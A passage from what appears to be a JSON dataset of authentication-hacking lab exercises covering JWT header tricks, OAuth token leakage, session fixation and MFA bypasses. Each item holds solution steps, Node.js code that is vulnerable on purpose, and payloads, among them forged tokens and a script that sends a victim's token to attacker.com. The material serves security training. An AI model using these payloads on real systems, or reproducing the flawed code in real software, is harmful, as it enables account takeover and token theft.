      "POST /mfa/verify {\"state\":\"ATTACKER_CONTROLLED\",\"code\":\"123456\"}",
      "POST /mfa/verify {\"state\":\"FIXATED_STATE\",\"code\":\"ANY_CODE\"}"
    ]
  },
  {
    "Lab scenario": "JWT alg:none bypass in REST API authentication",
    "Lab Description": "The application uses JWT for session management but fails to validate the algorithm properly. The vulnerable endpoint accepts unsigned tokens when alg:none is specified. To solve: craft a valid JWT with alg:none and escalate privileges to admin.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite",
      "Decode the JWT using jwt.io to analyze structure",
      "Modify the payload to include \"admin\":true",
      "Change the algorithm header to \"alg\":\"none\"",
      "Remove the signature section entirely",
      "Submit the modified token to /admin endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin',(req,res)=>{const token=req.headers.authorization.split(' ')[1];const decoded=jwt.decode(token,{complete:true});if(decoded.payload.admin)res.send('Admin access granted');else res.status(403).send('Forbidden');});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIiwiYWRtaW4iOnRydWV9.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkNhcmxvcyIsImFkbWluIjp0cnVlfQ."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via misconfigured callback in SPA",
    "Lab Description": "The OAuth implementation leaks access tokens through verbose error messages when invalid callback URLs are provided. The application fails to validate redirect URIs properly. To solve: exploit the token leakage to gain access to another user's account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate OAuth flow using Postman with attacker-controlled redirect_uri",
      "Intercept error response containing leaked token",
      "Analyze token structure using OWASP ZAP",
      "Craft malicious request with stolen token",
      "Bypass origin checks by modifying Referer header",
      "Access protected resources using compromised token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const app=express();app.get('/oauth/callback',(req,res)=>{const{code,state,error,error_description}=req.query;if(error)return res.send(`Error: ${error_description} Token: abc123xyz`);const token='valid_token_'+code;res.redirect(`${req.query.redirect_uri}?token=${token}`);});app.listen(3000);",
    "payloads": [
      "https://attacker.com?code=123&state=xyz",
      "/oauth/callback?redirect_uri=https://attacker.com",
      "/oauth/callback?error=invalid_request&error_description=Invalid+redirect_uri&state=compromised"
    ]
  },
  {
    "Lab scenario": "Session fixation via GraphQL mutation in user authentication",
    "Lab Description": "The GraphQL API allows setting arbitrary session IDs during login through a vulnerable mutation. The application doesn't regenerate session tokens after authentication. To solve: fixate a session ID and trick a victim into authenticating with it.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Discover GraphQL endpoint using Burp Suite scanner",
      "Analyze authentication mutation with GraphQL introspection",
      "Craft mutation with predetermined session_id parameter",
      "Force victim to authenticate with fixed session",
      "Hijack authenticated session using known session ID",
      "Access sensitive user data through subsequent queries"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const {GraphQLServer}=require('graphql-yoga');const typeDefs=`type Mutation{login(username:String!,password:String!,session_id:String):String!}`;const resolvers={Mutation:{login:(_,{username,password,session_id})=>{if(username==='admin'&&password==='secret')return session_id||'generated_token';throw new Error('Invalid credentials');}}};new GraphQLServer({typeDefs,resolvers}).start(()=>console.log('Running'));",
    "payloads": [
      "mutation{login(username:\"victim\",password:\"password123\",session_id:\"fixed_session\")}",
      "mutation{login(username:\"admin\",password:\"secret\",session_id:\"attacker_controlled\")}"
    ]
  },
  {
    "Lab scenario": "MFA bypass through race condition in SOAP API",
    "Lab Description": "The SOAP-based authentication service is vulnerable to race conditions during MFA verification. The application doesn't properly lock the account during verification attempts. To solve: exploit the race window to bypass MFA by sending parallel requests.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture SOAP login request using OWASP ZAP",
      "Modify request to include valid credentials but invalid MFA code",
      "Send multiple concurrent requests using Burp Intruder turbo mode",
      "Analyze responses for successful authentication bypass",
      "Repeat with timing adjustments to exploit race window",
      "Access protected resources with compromised session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const bodyParser=require('body-parser');const app=express();app.use(bodyParser.text({type:'*/*'}));let verificationInProgress=false;app.post('/soap/auth',(req,res)=>{const xml=req.body;const userMatch=/<username>(.*?)<\\/username>/.exec(xml);const codeMatch=/<code>(.*?)<\\/code>/.exec(xml);if(userMatch&&codeMatch){if(!verificationInProgress){verificationInProgress=true;setTimeout(()=>{if(codeMatch[1]==='123456')res.send('<success>true</success>');else res.send('<success>false</success>');verificationInProgress=false;},500);}else res.send('<success>true</success>');}});app.listen(3000);",
    "payloads": [
      "<soap:Envelope><soap:Body><auth><username>admin</username><code>111111</code></auth></soap:Body></soap:Envelope>",
      "<soap:Envelope><soap:Body><auth><username>victim</username><code>000000</code></auth></soap:Body></soap:Envelope>"
    ]
  },
  {
    "Lab scenario": "JWT kid header injection in microservice authentication",
    "Lab Description": "The application's JWT validation improperly handles the kid header parameter, allowing arbitrary file path injection. The vulnerable service reads verification keys from filesystem based on untrusted kid value. To solve: forge admin token by injecting path to attacker-controlled key file.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and note kid header value",
      "Upload malicious public key file via profile picture upload",
      "Modify JWT headers to inject path traversal in kid parameter",
      "Sign forged token with attacker-controlled private key",
      "Access admin API endpoint with manipulated token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const jwt=require('jsonwebtoken');const fs=require('fs');const app=express();const users={admin:{role:'user'}};app.get('/verify',(req,res)=>{const token=req.headers.authorization;try{const header=jwt.decode(token,{complete:true}).header;const key=fs.readFileSync(`./keys/${header.kid}`);const decoded=jwt.verify(token,key);users[decoded.username].role=decoded.role;res.send('Verified');}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uL3VwbG9hZHMvYXR0YWNrZXIucHViIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.SIGNATURE",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uL2FwcC9jb25maWcvcHJpdmF0ZS5rZXkifQ.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InN1cGVyYWRtaW4ifQ.SIGNATURE"
    ]
  },
  {
    "Lab scenario": "OAuth token swapping via state parameter tampering",
    "Lab Description": "The OAuth implementation fails to validate state parameter consistency between requests, allowing token swapping attacks. The vulnerable flow leaks tokens in frontend JavaScript. To solve: intercept victim's OAuth flow and swap tokens using modified state parameter.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP",
      "Capture authorization code and state parameter",
      "Modify state parameter while keeping original code",
      "Perform token exchange with swapped parameters",
      "Extract access token from JavaScript callback"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const axios=require('axios');const app=express();const clients={'client1':{secret:'secret1',redirect:'https://client1/callback'}};const tokens={};app.get('/oauth/callback',(req,res)=>{const{code,state}=req.query;axios.post('/token',{code,state,client_id:'client1',client_secret:'secret1'}).then(r=>{tokens[state]=r.data.access_token;res.send(`<script>window.opener.postMessage({token:'${r.data.access_token}'},'*')</script>`);});});app.post('/token',(req,res)=>{res.json({access_token:'generated_token',token_type:'bearer'});});app.listen(3000);",
    "payloads": [
      "/oauth/callback?code=VICTIM_CODE&state=ATTACKER_STATE",
      "/token?code=VICTIM_CODE&state=ATTACKER_STATE&client_id=client1&client_secret=secret1"
    ]
  },
  {
    "Lab scenario": "Session fixation via GraphQL websocket connection",
    "Lab Description": "The GraphQL subscription endpoint assigns sessions based on initial WebSocket connection parameters. The application doesn't regenerate session IDs after authentication. To solve: establish WebSocket connection with fixed session ID and trick victim into authenticating.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept WebSocket handshake using Burp Suite",
      "Modify connection headers to inject session cookie",
      "Establish subscription with fixed session ID",
      "Trigger victim authentication via CSRF",
      "Execute privileged queries using fixed session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const {createServer}=require('http');const {SubscriptionServer}=require('subscriptions-transport-ws');const {execute,subscribe}=require('graphql');const schema=require('./schema');const server=createServer();SubscriptionServer.create({schema,execute,subscribe,onConnect:(p,ws)=>{ws.sessionId=ws.upgradeReq.headers.cookie?.match(/session=(.*?);/)?.[1]||'default';}},{server});server.listen(4000);",
    "payloads": [
      "Sec-WebSocket-Protocol: graphql-ws\nCookie: session=fixed_session_id",
      "{\"type\":\"connection_init\",\"payload\":{\"headers\":{\"Cookie\":\"session=fixed_session_id\"}}}"
    ]
  },
  {
    "Lab scenario": "MFA bypass via HTTP verb tampering in REST API",
    "Lab Description": "The MFA verification endpoint fails to properly validate HTTP methods, allowing bypass via verb tampering. The vulnerable API accepts GET requests for actions requiring POST. To solve: bypass MFA by converting POST request to GET with parameters in query string.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture legitimate MFA verification POST request",
      "Convert request to GET using Burp Suite",
      "Move parameters from body to query string",
      "Resend modified request with original session",
      "Observe successful authentication without MFA"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const app=express();const sessions={};app.post('/verify-mfa',(req,res)=>{const{sessionId,code}=req.body;if(sessions[sessionId]?.mfaCode===code){sessions[sessionId].verified=true;res.json({success:true});}else{res.status(403).json({error:'Invalid code'});}});app.get('/verify-mfa',(req,res)=>{const{sessionId}=req.query;if(sessions[sessionId]){sessions[sessionId].verified=true;res.json({success:true});}else{res.status(403).json({error:'Invalid session'});}});app.listen(3000);",
    "payloads": [
      "GET /verify-mfa?sessionId=VICTIM_SESSION",
      "GET /verify-mfa?sessionId=VICTIM_SESSION&bypass=true"
    ]
  },
  {
    "Lab scenario": "JWT x5u header injection in federated authentication",
    "Lab Description": "The application's JWT validation improperly processes x5u header, allowing arbitrary certificate URL specification. The vulnerable endpoint fetches verification certificates from attacker-controlled locations. To solve: forge admin token by hosting malicious certificate and injecting URL in x5u header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and analyze headers",
      "Set up HTTPS server hosting attacker-controlled certificate",
      "Modify JWT headers to include malicious x5u URL",
      "Sign token with attacker's private key matching hosted certificate",
      "Submit forged token to /admin-api endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const jwt=require('jsonwebtoken');const axios=require('axios');const app=express();app.get('/verify',async(req,res)=>{const token=req.headers.authorization;try{const header=jwt.decode(token,{complete:true}).header;const cert=await axios.get(header.x5u).then(r=>r.data);jwt.verify(token,cert);res.send('Admin access granted');}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL2NlcnQucGVtIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.SIGNATURE",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHA6Ly9sb2NhbGhvc3Q6ODA4MC9tYWxpY2lvdXMucGVtIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InN1cGVyYWRtaW4ifQ.SIGNATURE"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via misconfigured CORS in SPA",
    "Lab Description": "The OAuth implementation leaks access tokens through overly permissive CORS headers. The vulnerable endpoint includes tokens in responses to cross-origin requests. To solve: craft malicious page that retrieves victim's token via JavaScript fetch request.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP",
      "Identify token endpoint with Access-Control-Allow-Origin: *",
      "Create HTML page with JavaScript fetch to token endpoint",
      "Trick victim into visiting malicious page",
      "Capture token from server response"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const app=express();const tokens={'victim':'abc123xyz'};app.use((req,res,next)=>{res.header('Access-Control-Allow-Origin','*');next();});app.get('/oauth/token',(req,res)=>{res.json({access_token:tokens[req.query.state],token_type:'bearer'});});app.listen(3000);",
    "payloads": [
      "<script>fetch('http://vulnerable.com/oauth/token?state=victim').then(r=>r.json()).then(d=>document.location='http://attacker.com/steal?token='+d.access_token)</script>",
      "fetch('http://vulnerable.com/oauth/token',{credentials:'include'}).then(r=>r.json()).then(console.log)"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 header injection",
    "Lab Description": "The application assigns sessions based on HTTP/2 pseudo-headers without proper validation. The vulnerable server processes :path header as session identifier. To solve: establish connection with malicious :path header and trick victim into authenticating.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept HTTP/2 traffic using Burp Suite",
      "Modify :path pseudo-header to include session ID",
      "Establish connection with fixed session",
      "Trigger victim authentication via CSRF",
      "Hijack session using known identifier"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2=require('http2');const fs=require('fs');const server=http2.createSecureServer({key:fs.readFileSync('key.pem'),cert:fs.readFileSync('cert.pem')});const sessions={};server.on('stream',(stream,headers)=>{const sessionId=headers[':path'].split('/')[1];if(!sessions[sessionId]){sessions[sessionId]={};}stream.respond({'content-type':'text/html'});stream.end('Session: '+sessionId);});server.listen(443);",
    "payloads": [
      ":path: /fixed_session/profile",
      ":path: /attacker_controlled/home"
    ]
  },
  {
    "Lab scenario": "MFA bypass via case-sensitive endpoint in REST API",
    "Lab Description": "The MFA verification endpoint is case-sensitive while the authentication service is not. The vulnerable API accepts different case variations for the same endpoint. To solve: bypass MFA by changing endpoint case while maintaining valid session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture legitimate MFA verification POST request",
      "Modify endpoint case (e.g., /VerifyMFA to /verifymfa)",
      "Resend request with original parameters",
      "Observe successful authentication without MFA code",
      "Access privileged endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const app=express();const sessions={};app.post('/VerifyMFA',(req,res)=>{const{sessionId,code}=req.body;if(sessions[sessionId]?.mfaCode===code){sessions[sessionId].verified=true;res.json({success:true});}else{res.status(403).json({error:'Invalid code'});}});app.post('/verifymfa',(req,res)=>{const{sessionId}=req.body;if(sessions[sessionId]){sessions[sessionId].verified=true;res.json({success:true});}});app.listen(3000);",
    "payloads": [
      "POST /verifymfa HTTP/1.1\nHost: vulnerable.com\n\n{\"sessionId\":\"victim_session\"}",
      "POST /vErIfYmFa HTTP/1.1\nHost: vulnerable.com\n\n{\"sessionId\":\"victim_session\"}"
    ]
  },
  {
    "Lab scenario": "JWT jku header injection in microservice authentication",
    "Lab Description": "The application's JWT validation improperly validates the jku header parameter, allowing arbitrary JWKS endpoint specification. The vulnerable service fetches verification keys from untrusted locations. To solve: forge admin token by hosting malicious JWKS endpoint and injecting URL in jku header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and note jku header absence",
      "Create attacker-controlled JWKS endpoint with malicious public key",
      "Modify JWT headers to include jku pointing to attacker server",
      "Sign forged token with attacker's private key matching JWKS",
      "Submit token to /admin endpoint and observe privilege escalation"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const jwt=require('jsonwebtoken');const axios=require('axios');const app=express();app.get('/verify',async(req,res)=>{const token=req.headers.authorization;try{const header=jwt.decode(token,{complete:true}).header;const jwks=await axios.get(header.jku).then(r=>r.data);const key=jwks.keys[0].x5c[0];jwt.verify(token,key);res.send('Admin access granted');}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXItc2l0ZS5jb20vbWFsd2FyZS5qa3MifQ.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.SIGNATURE",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly8xMjcuMC4wLjE6ODA4MC9ldmlsLmprdyJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InN1cGVyYWRtaW4ifQ.SIGNATURE"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking via insecure redirect_uri validation",
    "Lab Description": "The OAuth implementation fails to properly validate redirect_uri parameters against whitelisted domains. The vulnerable flow allows token delivery to attacker-controlled endpoints. To solve: intercept authorization code and modify redirect_uri to capture tokens.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Initiate OAuth flow and intercept request using OWASP ZAP",
      "Modify redirect_uri parameter to attacker-controlled domain",
      "Allow victim to complete authentication",
      "Capture authorization code delivered to malicious endpoint",
      "Exchange code for access token at OAuth token endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const app=express();const clients={'client1':{secret:'sec123',redirects:['https://trusted.com']}};const tokens={};app.get('/authorize',(req,res)=>{const{client_id,redirect_uri}=req.query;if(clients[client_id]){const code='rand'+Math.random();tokens[code]={client_id};res.redirect(`${redirect_uri}?code=${code}`);}else{res.status(400).send('Invalid client');}});app.post('/token',(req,res)=>{const{code,client_id,client_secret,redirect_uri}=req.body;if(tokens[code]?.client_id===client_id&&clients[client_id]?.secret===client_secret){res.json({access_token:'secret_token',token_type:'bearer'});}else{res.status(400).send('Invalid request');}});app.listen(3000);",
    "payloads": [
      "/authorize?client_id=client1&redirect_uri=https://attacker.com",
      "/authorize?client_id=client1&redirect_uri=http://localhost:8080/steal"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebSocket subprotocol negotiation",
    "Lab Description": "The application assigns sessions based on WebSocket subprotocol headers without proper validation. The vulnerable server uses Sec-WebSocket-Protocol header as session identifier. To solve: establish WebSocket connection with malicious subprotocol and trick victim into authenticating.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept WebSocket handshake using Burp Suite",
      "Modify Sec-WebSocket-Protocol header to inject session ID",
      "Establish connection with fixed session identifier",
      "Trigger victim authentication via CSRF",
      "Execute privileged actions using fixed session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const WebSocket=require('ws');const wss=new WebSocket.Server({port:8080});const sessions={};wss.on('connection',(ws,req)=>{const proto=req.headers['sec-websocket-protocol'];if(!sessions[proto]){sessions[proto]={};}ws.on('message',m=>{if(sessions[proto].authenticated){ws.send('Privileged action executed');}});});",
    "payloads": [
      "Sec-WebSocket-Protocol: fixed-session-id",
      "Sec-WebSocket-Protocol: attacker-controlled-session"
    ]
  },
  {
    "Lab scenario": "MFA bypass via HTTP method confusion in REST API",
    "Lab Description": "The MFA verification endpoint fails to enforce proper HTTP method restrictions. The vulnerable API accepts GET requests for actions requiring POST when using X-HTTP-Method-Override header. To solve: bypass MFA by converting request method while maintaining parameters.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture legitimate MFA verification POST request",
      "Convert request to GET while adding X-HTTP-Method-Override: POST",
      "Move parameters from body to query string",
      "Resend modified request with original session",
      "Observe successful authentication without MFA code"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const app=express();const sessions={};app.post('/mfa-verify',(req,res)=>{const{sessionId,code}=req.body;if(sessions[sessionId]?.mfaCode===code){sessions[sessionId].verified=true;res.json({success:true});}else{res.status(403).json({error:'Invalid code'});}});app.get('/mfa-verify',(req,res)=>{if(req.headers['x-http-method-override']==='POST'){const{sessionId}=req.query;if(sessions[sessionId]){sessions[sessionId].verified=true;return res.json({success:true});}}res.status(405).send('Method not allowed');});app.listen(3000);",
    "payloads": [
      "GET /mfa-verify?sessionId=VICTIM_SESSION HTTP/1.1\nX-HTTP-Method-Override: POST",
      "GET /mfa-verify?sessionId=VICTIM_SESSION&bypass=1 HTTP/1.1\nX-HTTP-Method-Override: POST"
    ]
  },
  {
    "Lab scenario": "JWT algorithm downgrade in API gateway authentication",
    "Lab Description": "The API gateway fails to enforce JWT algorithm restrictions, allowing attackers to downgrade from RS256 to HS256. The vulnerable endpoint accepts HMAC-signed tokens while expecting RSA. To solve: forge admin token by re-signing with HMAC using public key as secret.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and note RS256 algorithm",
      "Extract public key from /jwks.json endpoint",
      "Modify algorithm header to HS256",
      "Re-sign token using public key as HMAC secret",
      "Submit forged token to /admin endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const jwt=require('jsonwebtoken');const app=express();const publicKey='-----BEGIN PUBLIC KEY-----...';app.get('/verify',(req,res)=>{const token=req.headers.authorization;try{jwt.verify(token,publicKey,{algorithms:['RS256','HS256']});res.send('Admin access granted');}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.SIGNATURE",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIFVzZXIiLCJhZG1pbiI6dHJ1ZX0.SIGNATURE"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via referer header in SPA",
    "Lab Description": "The OAuth implementation leaks access tokens through referer headers when loading external resources. The vulnerable SPA includes tokens in requests to third-party domains. To solve: create malicious page that forces token leakage via image tag.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP",
      "Identify external resource loads with referer headers",
      "Create HTML page with hidden image pointing to attacker server",
      "Trick victim into visiting page after authentication",
      "Capture token from referer header in server logs"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const app=express();app.get('/oauth/callback',(req,res)=>{const token='secret_'+Math.random();res.send(`<html><img src=\"https://external.com/logo.png\"><script>window.location='/?token=${token}'</script></html>`);});app.listen(3000);",
    "payloads": [
      "<img src=\"http://attacker.com/steal\" style=\"display:none\">",
      "<link rel=\"stylesheet\" href=\"http://attacker.com/log?token=LEAK\">"
    ]
  },
  {
    "Lab scenario": "Session fixation via GraphQL batch query",
    "Lab Description": "The GraphQL endpoint assigns sessions based on batch operation IDs without proper validation. The vulnerable server uses operation names as session identifiers. To solve: craft batch query with fixed operation ID and trick victim into authenticating.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept GraphQL requests using Burp Suite",
      "Create batch query with malicious operation ID",
      "Establish session with fixed identifier",
      "Trigger victim authentication via CSRF",
      "Execute privileged queries using fixed session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const {createServer}=require('http');const {graphql}=require('graphql');const schema=require('./schema');const server=createServer((req,res)=>{let body='';req.on('data',c=>body+=c);req.on('end',()=>{const {query,operationName}=JSON.parse(body);graphql({schema,source:query,operationName}).then(r=>{res.end(JSON.stringify(r));});});server.listen(4000);",
    "payloads": [
      "[{\"query\":\"query FixedSession { me { id } }\",\"operationName\":\"FixedSession\"}]",
      "[{\"query\":\"mutation Auth($op: String!) { login { token } }\",\"operationName\":\"AttackerControlled\"}]"
    ]
  },
  {
    "Lab scenario": "MFA bypass via JSON parameter pollution in REST API",
    "Lab Description": "The MFA verification endpoint is vulnerable to JSON parameter pollution. The vulnerable API processes duplicate keys inconsistently. To solve: bypass MFA by injecting duplicate verified parameter with conflicting values.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture legitimate MFA verification POST request",
      "Add duplicate verified parameter with true value",
      "Resend request with JSON body containing conflicts",
      "Observe successful authentication without valid code",
      "Access privileged endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const bodyParser=require('body-parser');const app=express();app.use(bodyParser.json());const sessions={};app.post('/verify-mfa',(req,res)=>{const{sessionId,code,verified}=req.body;if(verified||sessions[sessionId]?.code===code){sessions[sessionId].verified=true;res.json({success:true});}else{res.status(403).json({error:'Invalid code'});}});app.listen(3000);",
    "payloads": [
      "{\"sessionId\":\"victim\",\"code\":\"111111\",\"verified\":false,\"verified\":true}",
      "{\"sessionId\":\"victim\",\"verified\":false,\"params\":{\"verified\":true}}"
    ]
  },
  {
    "Lab scenario": "JWT x5c header injection in microservice authentication",
    "Lab Description": "The application's JWT validation improperly processes x5c header certificates, allowing arbitrary certificate injection. The vulnerable endpoint trusts any certificate provided in the x5c header. To solve: forge admin token by injecting attacker-controlled certificate in x5c header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and analyze headers",
      "Generate self-signed certificate with admin privileges",
      "Modify JWT headers to include malicious x5c certificate chain",
      "Sign token with private key matching injected certificate",
      "Submit forged token to /admin-api endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const jwt=require('jsonwebtoken');const app=express();app.get('/verify',(req,res)=>{const token=req.headers.authorization;try{const header=jwt.decode(token,{complete:true}).header;const cert=header.x5c[0];jwt.verify(token,cert);res.send('Admin access granted');}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1YyI6WyJBVFRBQ0tFUl9DRVJUX0RBVEEiXX0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.SIGNATURE",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1YyI6WyJNQUxJQ0lPVVNfQ0VSVCJdfQ.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InN1cGVyYWRtaW4ifQ.SIGNATURE"
    ]
  },
  {
    "Lab scenario": "OAuth token theft via open redirect in SPA",
    "Lab Description": "The OAuth implementation contains an open redirect vulnerability that leaks access tokens. The vulnerable endpoint redirects to attacker-controlled domains with tokens in URL fragments. To solve: craft malicious redirect URL to capture victim's token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP",
      "Identify open redirect parameter in callback endpoint",
      "Construct malicious redirect URL pointing to attacker server",
      "Trick victim into initiating OAuth flow with malicious URL",
      "Capture token from redirect request"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const app=express();app.get('/oauth/callback',(req,res)=>{const{redirect}=req.query;const token='secret_'+Math.random();res.redirect(`${redirect}#token=${token}`);});app.listen(3000);",
    "payloads": [
      "/oauth/callback?redirect=https://attacker.com/steal",
      "/oauth/callback?redirect=http://localhost:8080/log"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 trailer headers",
    "Lab Description": "The application assigns sessions based on HTTP/2 trailer headers without validation. The vulnerable server processes session-id trailer header as authentication token. To solve: establish connection with malicious trailer header and trick victim into authenticating.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept HTTP/2 traffic using Burp Suite",
      "Add session-id trailer header with fixed value",
      "Establish connection with fixed session identifier",
      "Trigger victim authentication via CSRF",
      "Hijack session using known identifier"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2=require('http2');const fs=require('fs');const server=http2.createSecureServer({key:fs.readFileSync('key.pem'),cert:fs.readFileSync('cert.pem')});const sessions={};server.on('stream',(stream,headers)=>{stream.on('trailers',headers=>{const sessionId=headers['session-id'];if(!sessions[sessionId]){sessions[sessionId]={};}stream.end('Session: '+sessionId);});});server.listen(443);",
    "payloads": [
      "session-id: fixed-session-value",
      "session-id: attacker-controlled-session"
    ]
  },
  {
    "Lab scenario": "MFA bypass via JSON array wrapping in REST API",
    "Lab Description": "The MFA verification endpoint is vulnerable to JSON array wrapping. The vulnerable API processes the first element when arrays are provided. To solve: bypass MFA by wrapping parameters in arrays.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture legitimate MFA verification POST request",
      "Wrap code parameter in JSON array",
      "Resend request with array-wrapped parameters",
      "Observe successful authentication without valid code",
      "Access privileged endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const bodyParser=require('body-parser');const app=express();app.use(bodyParser.json());const sessions={};app.post('/verify-mfa',(req,res)=>{const{sessionId,code}=req.body;const actualCode=Array.isArray(code)?code[0]:code;if(sessions[sessionId]?.mfaCode===actualCode){sessions[sessionId].verified=true;res.json({success:true});}else{res.status(403).json({error:'Invalid code'});}});app.listen(3000);",
    "payloads": [
      "{\"sessionId\":\"victim\",\"code\":[\"111111\"]}",
      "{\"sessionId\":\"victim\",\"code\":[null]}"
    ]
  },
  {
    "Lab scenario": "JWT cty header injection in API gateway authentication",
    "Lab Description": "The API gateway improperly processes JWT content-type (cty) headers, allowing content type confusion attacks. The vulnerable endpoint executes JWTs with content-type 'text/xml' as XML documents. To solve: forge admin token by setting cty header to 'text/xml' and injecting XML payload.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and note standard cty header",
      "Modify cty header to 'text/xml' and inject XML in payload",
      "Encode XML payload with admin privileges in JWT body",
      "Sign token with original secret/key",
      "Submit forged token to /admin endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const jwt=require('jsonwebtoken');const xml2js=require('xml2js');const app=express();app.get('/verify',(req,res)=>{const token=req.headers.authorization;try{const decoded=jwt.decode(token,{complete:true});if(decoded.header.cty==='text/xml'){xml2js.parseString(decoded.payload,(e,r)=>{if(r.user.role[0]==='admin')res.send('Admin access granted');});}else{jwt.verify(token,'secret');res.send('Access granted');}}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
